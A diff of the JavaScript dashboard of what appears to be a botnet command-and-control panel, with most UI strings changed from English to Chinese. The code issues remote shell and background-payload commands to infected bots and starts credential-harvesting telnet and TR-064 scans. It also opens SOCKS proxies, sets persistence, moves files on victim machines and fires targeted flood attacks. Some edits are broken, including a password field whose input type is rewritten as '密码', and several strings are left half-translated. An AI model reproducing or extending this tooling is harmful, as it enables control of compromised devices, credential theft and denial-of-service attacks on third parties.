@@ -39,11 +39,11 @@ function capTagsHtml(b) {
 
 function ago(iso) {
   var d = new Date(iso), s = Math.max(0, Math.floor((Date.now() - d) / 1000));
-  if (s < 5) return 'just now';
-  if (s < 60) return s + 's ago';
-  if (s < 3600) return Math.floor(s / 60) + 'm ago';
-  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
-  return Math.floor(s / 86400) + 'd ago';
+  if (s < 5) return '刚刚';
+  if (s < 60) return s + ' 秒前';
+  if (s < 3600) return Math.floor(s / 60) + ' 分钟前';
+  if (s < 86400) return Math.floor(s / 3600) + ' 小时前';
+  return Math.floor(s / 86400) + ' 天前';
 }
 
 function botHealth(lastPing) {
@@ -162,11 +162,11 @@ function updateSSEIndicator(connected) {
   clearTimeout(_sseRedTimer);
   var el = document.getElementById('sse-dot');
   if (connected) {
-    if (el) { el.className = 'sse-indicator sse-connected'; el.title = 'Live connection'; }
+    if (el) { el.className = 'sse-indicator sse-connected'; el.title = '实时连接'; }
     hideSSEBanner();
   } else {
     _sseRedTimer = setTimeout(function () {
-      if (el) { el.className = 'sse-indicator sse-disconnected'; el.title = 'Reconnecting...'; }
+      if (el) { el.className = 'sse-indicator sse-disconnected'; el.title = '正在重连...'; }
       showSSEBanner();
     }, 3000);
   }
@@ -197,7 +197,7 @@ var prevBots = -1, prevRAM = -1, prevCPU = -1;
 function updateStats(d) {
   document.getElementById('s-bots').textContent = d.botCount;
   document.getElementById('s-ram').textContent = formatRAM(d.totalRAM);
-  document.getElementById('s-cpu').textContent = d.totalCPU + ' cores';
+  document.getElementById('s-cpu').textContent = d.totalCPU + ' 核';
   document.getElementById('s-uptime').textContent = d.uptime;
 
   var ah = document.getElementById('s-arch');
@@ -218,7 +218,7 @@ function updateStats(d) {
     drawSparkline('spark-cpu', d.history.map(function (h) { return h.totalCPU; }));
     var bots = d.history.map(function (h) { return h.botCount; });
     var mn = Math.min.apply(null, bots), mx = Math.max.apply(null, bots);
-    document.getElementById('s-bots-range').textContent = 'range: ' + mn + ' \u2013 ' + mx + ' (' + d.history.length + ' samples)';
+    document.getElementById('s-bots-range').textContent = '范围：' + mn + ' \u2013 ' + mx + ' (' + d.history.length + ' 个样本)';
   }
 }
 
@@ -437,14 +437,14 @@ function updateMultiSelectBar() {
   var count = Object.keys(selectedBots).length;
   var bar = document.getElementById('multi-select-bar');
   bar.style.display = count > 0 ? 'flex' : 'none';
-  document.getElementById('ms-count').textContent = count + ' selected';
+  document.getElementById('ms-count').textContent = count + ' 个已选择';
 }
 
 function msCmd(cmd) {
   var ids = Object.keys(selectedBots);
   if (!ids.length) return;
   ids.forEach(function (id) { popupCmd(id, cmd); });
-  showToast('Sent ' + cmd + ' to ' + ids.length + ' bots', true);
+  showToast('已发送 ' + cmd + ' 到 ' + ids.length + ' 个 Bot', true);
 }
 
 function msCmdFiltered(cmd, capField) {
@@ -455,9 +455,9 @@ function msCmdFiltered(cmd, capField) {
     return !capField || !b || b[capField] !== false;
   });
   var skipped = ids.length - capable.length;
-  if (!capable.length) { showToast('No selected bots support this command', false); return; }
+  if (!capable.length) { showToast('选中的 Bot 都不支持此命令', false); return; }
   capable.forEach(function (id) { popupCmd(id, cmd); });
-  var msg = 'Sent ' + cmd + ' to ' + capable.length + ' bot' + (capable.length > 1 ? 's' : '');
+  var msg = '已发送 ' + cmd + ' 到 ' + capable.length + ' bot' + (capable.length > 1 ? 's' : '');
   if (skipped > 0) msg += ' \xb7 ' + skipped + ' skipped (module absent)';
   showToast(msg, true);
 }
@@ -468,7 +468,7 @@ function msScan() {
   var addr = prompt('Scan server address (host:port):', '');
   if (!addr || !addr.trim()) return;
   ids.forEach(function (id) { popupCmd(id, '!scan ' + addr.trim()); });
-  showToast('Sent !scan to ' + ids.length + ' bots', true);
+  showToast('Sent !scan to ' + ids.length + ' 个 Bot', true);
 }
 
 // ---------------------------------------------------------------------------
@@ -478,7 +478,7 @@ function scannerStart(type) {
   var cmd;
   if (type === 'telnet') {
     var addr = document.getElementById('scan-telnet-addr').value.trim();
-    if (!addr) { showToast('Enter a scan server address', false); return; }
+    if (!addr) { showToast('请输入扫描服务器地址', false); return; }
     cmd = '!scan ' + addr;
   } else if (type === 'tr064') {
     cmd = '!tr064';
@@ -487,7 +487,7 @@ function scannerStart(type) {
   } else { return; }
   fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd }) })
     .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
-    .catch(function () { showToast('Request failed', false); });
+    .catch(function () { showToast('请求失败', false); });
 }
 
 function scannerStop(type) {
@@ -498,7 +498,7 @@ function scannerStop(type) {
   else { return; }
   fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd }) })
     .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
-    .catch(function () { showToast('Request failed', false); });
+    .catch(function () { showToast('请求失败', false); });
 }
 
 function msKill() {
@@ -606,7 +606,7 @@ function applyGroup(botIDs, group) {
       buildFilterPanel();
       filterBotTable();
     })
-    .catch(function () { showToast('Group request failed', false); });
+    .catch(function () { showToast('分组请求失败', false); });
 }
 
 function msSetGroup() {
@@ -758,8 +758,8 @@ function filterBotTable() {
   });
 
   var sc = document.getElementById('search-count');
-  if (q || useFilters) { sc.textContent = shown + ' / ' + total + ' bots'; }
-  else { sc.textContent = total + ' bots'; }
+  if (q || useFilters) { sc.textContent = shown + ' / ' + total + ' 个 Bot'; }
+  else { sc.textContent = total + ' 个 Bot'; }
 }
 
 // ---------------------------------------------------------------------------
@@ -774,7 +774,7 @@ function fillPopup(b) {
   document.getElementById('popup-ip').textContent = b.ip;
   document.getElementById('popup-arch').textContent = b.arch;
   document.getElementById('popup-ram').textContent = formatRAM(b.ram);
-  document.getElementById('popup-cpu').textContent = b.cpuCores + ' cores';
+  document.getElementById('popup-cpu').textContent = b.cpuCores + ' 核';
   document.getElementById('popup-uplink').innerHTML = formatUplink(b.uplinkMbps);
   document.getElementById('popup-proc').textContent = b.processName;
   document.getElementById('popup-uptime').textContent = b.uptime;
@@ -868,7 +868,7 @@ function renderBotSidebar(b) {
   var id = b.botID.replace(/'/g, "\\'");
   var eid = escHtml(b.botID);
   var socksColor = b.socksActive ? 'var(--green)' : 'var(--text-dim)';
-  var socksLabel = b.socksActive ? 'ACTIVE' : 'OFFLINE';
+  var socksLabel = b.socksActive ? 'ACTIVE' : '离线';
 
   // ── Identity & hardware info ────────────────────────────────────────────
   var info =
@@ -937,7 +937,7 @@ function renderBotSidebar(b) {
 function popupCmd(botID, cmd) {
   fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd, botID: botID }) })
     .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
-    .catch(function () { showToast('Request failed', false); });
+    .catch(function () { showToast('请求失败', false); });
 }
 
 function popupKill(botID) {
@@ -1062,7 +1062,7 @@ function submitSocksModal() {
 
   if (mode === 'relay') {
     var relay = (document.getElementById('socks-m-relay') || {}).value;
-    if (!relay) { showToast('No relay selected', false); return; }
+    if (!relay) { showToast('未选择中继', false); return; }
     popupCmd(botID, '!socks ' + relay);
   } else {
     var port = (document.getElementById('socks-m-port') || {}).value || '1080';
@@ -1077,8 +1077,8 @@ function submitSocksModal() {
 // ---------------------------------------------------------------------------
 
 var cmdArgDefs = {
-  '!shell': [{ id: 'arg-shell-cmd', label: 'Command', placeholder: 'e.g. whoami, ls -la, cat /etc/passwd', tooltip: 'Shell command to execute on targeted bots. Output is returned via C2.' }],
-  '!detach': [{ id: 'arg-detach-cmd', label: 'Command', placeholder: 'e.g. nohup ./payload &', tooltip: 'Command to run in background on bots. No output returned — fire and forget.' }],
+  '!shell': [{ id: 'arg-shell-cmd', label: '命令', placeholder: '例如 whoami, ls -la, cat /etc/passwd', tooltip: '在目标 Bot 上执行的 Shell 命令，输出通过 C2 返回。' }],
+  '!detach': [{ id: 'arg-detach-cmd', label: '命令', placeholder: 'e.g. nohup ./payload &', tooltip: 'Command to run in background on bots. No output returned — fire and forget.' }],
   '!socks': [
     {
       id: 'arg-socks-mode', label: 'Mode', type: 'select', options: [
@@ -1086,15 +1086,15 @@ var cmdArgDefs = {
         { v: 'relay', t: 'Relay (backconnect)' }
       ]
     },
-    { id: 'arg-socks-port', label: 'Listen Port', placeholder: 'e.g. 1080 (default)', showWhen: { field: 'arg-socks-mode', val: 'direct' }, tooltip: 'TCP port the SOCKS5 proxy listens on. Default 1080.' },
+    { id: 'arg-socks-port', label: '监听端口', placeholder: 'e.g. 1080 (default)', showWhen: { field: 'arg-socks-mode', val: 'direct' }, tooltip: 'SOCKS5 代理监听的 TCP 端口，默认 1080。' },
     { id: 'arg-socks-relay', label: 'Relay', type: 'select', options: [], showWhen: { field: 'arg-socks-mode', val: 'relay' }, tooltip: 'Relay server the bot backconnects to. Select from configured relays.' },
-    { id: 'arg-socks-user', label: 'Auth Username (optional)', placeholder: typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : '', tooltip: 'SOCKS5 auth username. Leave empty for no auth.' },
-    { id: 'arg-socks-pass', label: 'Auth Password (optional)', placeholder: typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : '', type: 'password', tooltip: 'SOCKS5 auth password. Leave empty for no auth.' }
+    { id: 'arg-socks-user', label: '认证用户名（可选）', placeholder: typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : '', tooltip: 'SOCKS5 认证用户名，留空表示不认证。' },
+    { id: 'arg-socks-pass', label: '认证密码（可选）', placeholder: typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : '', type: '密码', tooltip: 'SOCKS5 认证密码，留空表示不认证。' }
   ],
   '!stopsocks': [],
   '!socksauth': [
-    { id: 'arg-sa-user', label: 'Username', placeholder: 'socks username', tooltip: 'New SOCKS5 username to set on the bot proxy.' },
-    { id: 'arg-sa-pass', label: 'Password', placeholder: 'socks password', type: 'password', tooltip: 'New SOCKS5 password to set on the bot proxy.' }
+    { id: 'arg-sa-user', label: '用户名', placeholder: 'socks username', tooltip: 'New SOCKS5 username to set on the bot proxy.' },
+    { id: 'arg-sa-pass', label: '密码', placeholder: 'socks password', type: '密码', tooltip: 'New SOCKS5 password to set on the bot proxy.' }
   ],
   '!info': [], '!persist': [],
   '!scan': [{ id: 'arg-scan-addr', label: 'Scan Server', placeholder: 'host:port (e.g. 1.2.3.4:48290)', tooltip: 'Address of the scan listener server that receives credential results from bots.' }],
@@ -1120,7 +1120,7 @@ function updateArgFields() {
       d.options.forEach(function (o) { html += '<option value="' + o.v + '">' + o.t + '</option>'; });
       html += '</select>';
     } else {
-      html += '<input type="' + (d.type === 'password' ? 'password' : 'text') + '" id="' + d.id + '" placeholder="' + (d.placeholder || '') + '"' + tip + '>';
+      html += '<input type="' + (d.type === '密码' ? '密码' : 'text') + '" id="' + d.id + '" placeholder="' + (d.placeholder || '') + '"' + tip + '>';
     }
     html += '</div>';
   });
@@ -1165,16 +1165,16 @@ function sendCmd() {
   var typ = document.getElementById('cmd-type').value;
   var args = buildArgs().trim();
   var botID = document.getElementById('cmd-bot').value.trim();
-  if ((typ === '!shell' || typ === '!detach') && !args) { showToast('Please enter a command', false); return; }
-  if (typ === '!reinstall' && !args) { showToast('Please enter a script URL', false); return; }
+  if ((typ === '!shell' || typ === '!detach') && !args) { showToast('请输入命令', false); return; }
+  if (typ === '!reinstall' && !args) { showToast('请输入脚本 URL', false); return; }
   if (typ === '!socksauth') {
     var u = (document.getElementById('arg-sa-user') || {}).value || '';
     var p = (document.getElementById('arg-sa-pass') || {}).value || '';
-    if (!u || !p) { showToast('Username and password required', false); return; }
+    if (!u || !p) { showToast('需要用户名和密码', false); return; }
   }
 
-  if (typ === '!lolnogtfo' && !confirm('Kill all targeted bots? This cannot be undone.')) return;
-  if (typ === '!reinstall' && !confirm('Run reinstall script on all targeted bots?')) return;
+  if (typ === '!lolnogtfo' && !confirm('确认终止所有目标 Bot？此操作不可撤销。')) return;
+  if (typ === '!reinstall' && !confirm('确认在所有目标 Bot 上运行重装脚本？')) return;
   var command = typ;
   if (args) command += ' ' + args;
   fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: command, botID: botID }) })
@@ -1189,7 +1189,7 @@ function sendCmd() {
         }
       }
     })
-    .catch(function () { showToast('Request failed', false); });
+    .catch(function () { showToast('请求失败', false); });
 }
 
 // ---------------------------------------------------------------------------
@@ -1320,8 +1320,8 @@ function fmtUptimeSecs(s) {
 function removeRelay(id) {
   fetch('/api/relays?id=' + encodeURIComponent(id), { method: 'DELETE' })
     .then(function (r) { return r.json(); })
-    .then(function () { loadRelayStats(); showToast('Relay removed', true); })
-    .catch(function () { showToast('Failed to remove relay', false); });
+    .then(function () { loadRelayStats(); showToast('中继已移除', true); })
+    .catch(function () { showToast('中继移除失败', false); });
 }
 
 function showAddRelayModal() {
@@ -1345,8 +1345,8 @@ function showAddRelayModal() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(body)
       }).then(function (r) { return r.json(); })
-        .then(function () { loadRelayStats(); showToast('Relay added', true); })
-        .catch(function () { showToast('Failed to add relay', false); });
+        .then(function () { loadRelayStats(); showToast('中继已添加', true); })
+        .catch(function () { showToast('中继添加失败', false); });
     }
   });
 }
@@ -1417,7 +1417,7 @@ function filterActivity() {
   var countEl = document.getElementById('activity-count');
   if (countEl) {
     if (q || activityTypeFilter !== 'all') { countEl.textContent = shown + '/' + entries.length; }
-    else { countEl.textContent = entries.length ? entries.length + ' events' : ''; }
+    else { countEl.textContent = entries.length ? entries.length + ' 个事件' : ''; }
   }
 }
 
@@ -1445,7 +1445,7 @@ function updateTaskArgFields() {
       d.options.forEach(function (o) { html += '<option value="' + o.v + '">' + o.t + '</option>'; });
       html += '</select>';
     } else {
-      html += '<input type="' + (d.type === 'password' ? 'password' : 'text') + '" id="t-' + d.id + '" placeholder="' + (d.placeholder || '') + '">';
+      html += '<input type="' + (d.type === '密码' ? '密码' : 'text') + '" id="t-' + d.id + '" placeholder="' + (d.placeholder || '') + '">';
     }
     html += '</div>';
   });
@@ -1560,11 +1560,11 @@ function renderTaskTable(tasks) {
 function addTask() {
   var command = buildTaskCommand();
   var typ = document.getElementById('task-type').value;
-  if ((typ === '!shell' || typ === '!detach') && command === typ) { showToast('Please enter a command', false); return; }
+  if ((typ === '!shell' || typ === '!detach') && command === typ) { showToast('请输入命令', false); return; }
   if (typ === '!socksauth') {
     var u = (document.getElementById('t-arg-sa-user') || {}).value || '';
     var p = (document.getElementById('t-arg-sa-pass') || {}).value || '';
-    if (!u || !p) { showToast('Username and password required', false); return; }
+    if (!u || !p) { showToast('需要用户名和密码', false); return; }
   }
   var duration = parseInt((document.getElementById('task-duration') || {}).value) || 0;
   var runOnce = (document.getElementById('task-runonce') || {}).checked || false;
@@ -1574,25 +1574,25 @@ function addTask() {
     body: JSON.stringify({ command: command, duration: duration, runOnce: runOnce })
   }).then(function (r) { return r.json(); }).then(function (d) {
     if (d.success) {
-      showToast('Task created: ' + command, true);
+      showToast('任务已创建：' + command, true);
       document.getElementById('task-duration').value = '0';
       document.getElementById('task-runonce').checked = false;
       updateTaskArgFields();
       loadTasks();
     } else {
-      showToast(d.error || 'Failed to create task', false);
+      showToast(d.error || '任务创建失败', false);
     }
-  }).catch(function () { showToast('Request failed', false); });
+  }).catch(function () { showToast('请求失败', false); });
 }
 
 function deleteTask(id) {
-  if (!confirm('Remove this task?')) return;
+  if (!confirm('移除此任务？')) return;
   fetch('/api/tasks?id=' + encodeURIComponent(id), { method: 'DELETE' })
     .then(function (r) { return r.json(); })
     .then(function (d) {
-      showToast(d.success ? 'Task removed' : (d.error || 'Failed'), d.success !== false);
+      showToast(d.success ? '任务已移除' : (d.error || '失败'), d.success !== false);
       loadTasks();
-    }).catch(function () { showToast('Request failed', false); });
+    }).catch(function () { showToast('请求失败', false); });
 }
 
 // ---------------------------------------------------------------------------
@@ -1724,7 +1724,7 @@ function activateShellTab(idx) {
   var overlay = document.getElementById('shell-overlay');
   var output = document.getElementById('shell-output');
   var input = document.getElementById('shell-input');
-  document.getElementById('shell-title').textContent = 'Shell: ' + tab.botID;
+  document.getElementById('shell-title').textContent = 'Shell：' + tab.botID;
 
   // Bot info in header meta
   var b = window._bots && window._bots[tab.botID];
@@ -1827,8 +1827,8 @@ function activateShellTab(idx) {
       var a = document.createElement('a');
       a.href = url; a.download = name; a.click();
       URL.revokeObjectURL(url);
-      showToast('Downloaded: ' + name, true);
-    } catch (ex) { showToast('Download failed: ' + ex.message, false); }
+      showToast('已下载：' + name, true);
+    } catch (ex) { showToast('下载失败：' + ex.message, false); }
   }
   shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };
 
@@ -1977,7 +1977,7 @@ function parseClickableOutput(text) {
     span.textContent = val;
     if (m[1]) {
       span.className = 'out-ip'; span.title = 'Copy IP';
-      span.onclick = (function (v) { return function () { try { navigator.clipboard.writeText(v); } catch (e) { } showToast('Copied: ' + v, true); }; })(val);
+      span.onclick = (function (v) { return function () { try { navigator.clipboard.writeText(v); } catch (e) { } showToast('已复制：' + v, true); }; })(val);
     } else {
       span.className = 'out-path'; span.title = 'Navigate to path';
       span.onclick = (function (v) { return function () { shellCd(v); }; })(val);
@@ -2153,7 +2153,7 @@ function _ctxPath() {
 function ctxCopyPath() {
   var p = _ctxPath();
   try { navigator.clipboard.writeText(p); } catch (e) { }
-  showToast('Copied: ' + p, true); hideFileCtx();
+  showToast('已复制：' + p, true); hideFileCtx();
 }
 
 function ctxCd() { shellCd(_ctxEntry.name); hideFileCtx(); }
@@ -2161,17 +2161,17 @@ function ctxCd() { shellCd(_ctxEntry.name); hideFileCtx(); }
 function ctxCat() { shellSendCmd('cat ' + _shellQuoteJs(_ctxEntry.name)); hideFileCtx(); }
 
 function ctxChmod() {
-  var m = prompt('chmod mode (octal):', '755');
+  var m = prompt('chmod 模式（八进制）：', '755');
   hideFileCtx();
   if (!m) return;
-  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  if (!shellWS || shellWS.readyState !== 1) { showToast('未连接', false); return; }
   shellWS.send(JSON.stringify({ command: '!chmod ' + m + ' ' + _ctxPath() }));
   setTimeout(refreshFiles, 600);
 }
 
 function ctxDelete() {
-  if (!confirm('Delete ' + _ctxEntry.name + '?')) { hideFileCtx(); return; }
-  if (!shellWS || shellWS.readyState !== 1) { hideFileCtx(); showToast('Not connected', false); return; }
+  if (!confirm('删除 ' + _ctxEntry.name + '?')) { hideFileCtx(); return; }
+  if (!shellWS || shellWS.readyState !== 1) { hideFileCtx(); showToast('未连接', false); return; }
   if (_ctxEntry.isDir) {
     shellSendCmd('rm -rf ' + _shellQuoteJs(_ctxEntry.name));
   } else {
@@ -2181,10 +2181,10 @@ function ctxDelete() {
 }
 
 function ctxRename() {
-  var n = prompt('Rename to:', _ctxEntry.name);
+  var n = prompt('重命名为：', _ctxEntry.name);
   hideFileCtx();
   if (!n || n === _ctxEntry.name) return;
-  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  if (!shellWS || shellWS.readyState !== 1) { showToast('未连接', false); return; }
   var dst = (_ctxEntry.cwd && _ctxEntry.cwd !== '~') ? _ctxEntry.cwd + '/' + n : n;
   shellWS.send(JSON.stringify({ command: '!mv ' + _ctxPath() + ' ' + dst }));
   setTimeout(refreshFiles, 600);
@@ -2192,7 +2192,7 @@ function ctxRename() {
 
 function ctxDownload() {
   hideFileCtx();
-  if (_ctxEntry.isDir) { showToast('Cannot download a directory', false); return; }
+  if (_ctxEntry.isDir) { showToast('不能下载目录', false); return; }
   shellDownloadFile(_ctxEntry.name);
 }
 
@@ -2210,14 +2210,14 @@ function shellSendCmd(cmd) {
 
 // Sends a !download command; the CNC relays the file back as a {type:"file"} WS frame.
 function shellDownloadFile(name) {
-  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  if (!shellWS || shellWS.readyState !== 1) { showToast('未连接', false); return; }
   var path = (_ctxEntry && _ctxEntry.cwd && _ctxEntry.cwd !== '~') ? _ctxEntry.cwd + '/' + name : name;
   shellSendCmd('!download ' + path);
 }
 
 // Triggers the hidden file input to pick a file for upload.
 function shellUploadFile() {
-  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  if (!shellWS || shellWS.readyState !== 1) { showToast('未连接', false); return; }
   document.getElementById('shell-upload-input').value = '';
   document.getElementById('shell-upload-input').click();
 }
@@ -2226,7 +2226,7 @@ function shellUploadFile() {
 function shellHandleUpload(input) {
   var file = input.files && input.files[0];
   if (!file || !shellWS || shellWS.readyState !== 1) return;
-  if (file.size > 10 * 1024 * 1024) { showToast('File too large (>10MB)', false); return; }
+  if (file.size > 10 * 1024 * 1024) { showToast('文件过大（>10MB）', false); return; }
   var destDir = shellCwd && shellCwd !== '~' ? shellCwd : '/tmp';
   var destPath = destDir + '/' + file.name;
   var reader = new FileReader();
@@ -2309,14 +2309,14 @@ function navigateTabComplete(dir) {
 
 function copyShellOutput() {
   var text = document.getElementById('shell-output').textContent;
-  if (!text) { showToast('Nothing to copy', false); return; }
-  navigator.clipboard.writeText(text).then(function () { showToast('Output copied to clipboard', true); })
-    .catch(function () { showToast('Copy failed', false); });
+  if (!text) { showToast('没有可复制内容', false); return; }
+  navigator.clipboard.writeText(text).then(function () { showToast('输出已复制到剪贴板', true); })
+    .catch(function () { showToast('复制失败', false); });
 }
 
 function saveShellHistory() {
   var content = document.getElementById('shell-output').textContent;
-  if (!content) { showToast('Nothing to save', false); return; }
+  if (!content) { showToast('没有可保存内容', false); return; }
   var blob = new Blob([content], { type: 'text/plain' });
   var a = document.createElement('a');
   a.href = URL.createObjectURL(blob);
@@ -2342,7 +2342,7 @@ function shellZoom(delta) {
 }
 
 function shellNetScan() {
-  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  if (!shellWS || shellWS.readyState !== 1) { showToast('未连接', false); return; }
   var cmd = 'echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null && echo "=== ROUTES ===" && ip route 2>/dev/null || route -n 2>/dev/null && echo "=== ARP ===" && ip neigh 2>/dev/null || arp -a 2>/dev/null && echo "=== LISTENERS ===" && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null';
   shellSendCmd(cmd);
 }
@@ -2685,7 +2685,7 @@ function refreshAll() {
   fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
   fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots).catch(function () { });
   fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
-  showToast('Refreshed', true);
+  showToast('已刷新', true);
 }
 
 function toggleCompactMode() {
@@ -2749,7 +2749,7 @@ function targetBot(botID) {
   document.getElementById('cmd-target-clear').style.display = '';
   inp.classList.add('cmd-target-flash');
   setTimeout(function () { inp.classList.remove('cmd-target-flash'); }, 600);
-  showToast('Targeting ' + botID, true);
+  showToast('定向到 ' + botID, true);
 }
 
 // init category filter on load
@@ -3029,8 +3029,8 @@ function fireAttack() {
   var duration = document.getElementById('atk-duration').value.trim() || '30';
   var botID = document.getElementById('atk-bot').value.trim();
 
-  if (!target) { showToast('Enter a target IP', false); return; }
-  if (!method) { showToast('Select a method', false); return; }
+  if (!target) { showToast('请输入目标 IP', false); return; }
+  if (!method) { showToast('请选择方法', false); return; }
 
   // Build command: !method target port duration [key=val ...]
   var cmd = '!' + method + ' ' + target + ' ' + port + ' ' + duration;
@@ -3045,17 +3045,17 @@ function fireAttack() {
 
   var m = atkMethods.find(function (x) { return x.id === method; });
   var mName = m ? m.name : method;
-  var scope = botID ? 'Bot: ' + botID : 'ALL bots';
+  var scope = botID ? 'Bot: ' + botID : '全部 Bot';
 
   showConfirm({
     title: 'Launch Attack',
     message: 'You are about to fire an attack with the following parameters:',
     icon: 'danger',
     details: [
-      { label: 'Method', val: mName },
-      { label: 'Target', val: target + ':' + port },
-      { label: 'Duration', val: duration + 's' },
-      { label: 'Scope', val: scope }
+      { label: '方法', val: mName },
+      { label: '目标', val: target + ':' + port },
+      { label: '持续时间', val: duration + 's' },
+      { label: '范围', val: scope }
     ],
     confirmText: 'Fire',
     confirmClass: 'danger',
@@ -3067,21 +3067,21 @@ function fireAttack() {
       })
         .then(function (r) { return r.json(); })
         .then(function (d) { showToast(d.message, d.success); })
-        .catch(function () { showToast('Attack request failed', false); });
+        .catch(function () { showToast('任务请求失败', false); });
     }
   });
 }
 
 function stopAttack() {
   var botID = document.getElementById('atk-bot').value.trim();
-  var scope = botID || 'ALL bots';
+  var scope = botID || '全部 Bot';
 
   showConfirm({
     title: 'Stop Attacks',
     message: 'This will immediately stop all running attacks.',
     icon: 'warn',
     details: [
-      { label: 'Scope', val: scope }
+      { label: '范围', val: scope }
     ],
     confirmText: 'Stop All',
     confirmClass: 'warn',
@@ -3093,7 +3093,7 @@ function stopAttack() {
       })
         .then(function (r) { return r.json(); })
         .then(function (d) { showToast(d.message, d.success); })
-        .catch(function () { showToast('Stop request failed', false); });
+        .catch(function () { showToast('停止请求失败', false); });
     }
   });
 }
@@ -3108,7 +3108,7 @@ function loadUsers() {
   fetch('/api/users').then(function (r) { return r.json(); }).then(function (users) {
     usersData = users;
     renderUserCards(users);
-  }).catch(function () { showToast('Failed to load users', false); });
+  }).catch(function () { showToast('用户加载失败', false); });
 }
 
 function renderUserCards(users) {
@@ -3144,7 +3144,7 @@ function renderUserCards(users) {
 }
 
 function showAddUserForm() {
-  document.getElementById('user-form-title').textContent = 'Add User';
+  document.getElementById('user-form-title').textContent = '添加用户';
   document.getElementById('uf-editing').value = '';
   document.getElementById('uf-username').value = '';
   document.getElementById('uf-username').disabled = false;
@@ -3162,7 +3162,7 @@ function showAddUserForm() {
 function editUser(username) {
   var u = usersData.find(function (x) { return x.username === username; });
   if (!u) return;
-  document.getElementById('user-form-title').textContent = 'Edit User';
+  document.getElementById('user-form-title').textContent = '编辑用户';
   document.getElementById('uf-editing').value = username;
   document.getElementById('uf-username').value = u.username;
   document.getElementById('uf-username').disabled = true;
@@ -3193,7 +3193,7 @@ function saveUser() {
   var methods = methodsStr ? methodsStr.split(',').map(function (m) { return m.trim(); }).filter(Boolean) : [];
 
   if (!username || !password) {
-    showToast('Username and password required', false);
+    showToast('需要用户名和密码', false);
     return;
   }
 
@@ -3217,14 +3217,14 @@ function saveUser() {
     .then(function (r) { return r.json(); })
     .then(function (d) {
       if (d.success) {
-        showToast(editing ? 'User updated' : 'User created', true);
+        showToast(editing ? '用户已更新' : '用户已创建', true);
         hideUserForm();
         loadUsers();
       } else {
-        showToast(d.error || 'Failed', false);
+        showToast(d.error || '失败', false);
       }
     })
-    .catch(function () { showToast('Request failed', false); });
+    .catch(function () { showToast('请求失败', false); });
 }
 
 function deleteUser(username) {
@@ -3237,13 +3237,13 @@ function deleteUser(username) {
     .then(function (r) { return r.json(); })
     .then(function (d) {
       if (d.success) {
-        showToast('User deleted', true);
+        showToast('用户已删除', true);
         loadUsers();
       } else {
-        showToast(d.error || 'Failed', false);
+        showToast(d.error || '失败', false);
       }
     })
-    .catch(function () { showToast('Delete failed', false); });
+    .catch(function () { showToast('删除失败', false); });
 }
 
 // ---------------------------------------------------------------------------
@@ -3412,9 +3412,9 @@ function addTask() {
     headers: {'Content-Type':'application/json'},
     body: JSON.stringify({command: full, botID: ''})
   }).then(function(r){return r.json();}).then(function(d) {
-    if (d.success) { showToast('Task created: ' + (d.task.result || ''), true); loadTasks(); }
-    else showToast(d.message || 'Failed', false);
-  }).catch(function(){ showToast('Request failed', false); });
+    if (d.success) { showToast('任务已创建：' + (d.task.result || ''), true); loadTasks(); }
+    else showToast(d.message || '失败', false);
+  }).catch(function(){ showToast('请求失败', false); });
 }
 
 function updateTaskArgFields() {
@@ -3422,11 +3422,11 @@ function updateTaskArgFields() {
   var container = document.getElementById('task-arg-fields');
   if (!container) return;
   var fields = {
-    '!shell': [{placeholder:'command to run', style:'flex:1'}],
-    '!detach': [{placeholder:'command to run in background', style:'flex:1'}],
-    '!socks': [{placeholder:'relay address (optional)'}],
+    '!shell': [{placeholder:'要执行的命令', style:'flex:1'}],
+    '!detach': [{placeholder:'后台执行的命令', style:'flex:1'}],
+    '!socks': [{placeholder:'中继地址（可选）'}],
     '!stopsocks': [],
-    '!socksauth': [{placeholder:'username'}, {placeholder:'password'}],
+    '!socksauth': [{placeholder:'用户名'}, {placeholder:'密码'}],
     '!persist': [],
     '!lolnogtfo': []
   };
@@ -3464,10 +3464,10 @@ function wizardInit() {
 }
 
 function wizardNext() {
-  if (wizState.step === 1 && !wizState.method) { showToast('Select a method', false); return; }
+  if (wizState.step === 1 && !wizState.method) { showToast('请选择方法', false); return; }
   if (wizState.step === 2) {
     var t = document.getElementById('wiz-target').value.trim();
-    if (!t) { showToast('Enter a target IP', false); return; }
+    if (!t) { showToast('请输入目标 IP', false); return; }
   }
   wizState.step = Math.min(wizState.step + 1, 3);
   renderWizStep();
@@ -3501,7 +3501,7 @@ function renderWizReview() {
   var html = '<div class="wr-row"><span class="wr-label">Method</span><span class="wr-value">' + escHtml(wizState.method.name) + '</span></div>' +
     '<div class="wr-row"><span class="wr-label">Target</span><span class="wr-value">' + escHtml(target) + ':' + escHtml(port) + '</span></div>' +
     '<div class="wr-row"><span class="wr-label">Duration</span><span class="wr-value">' + dur + 's</span></div>' +
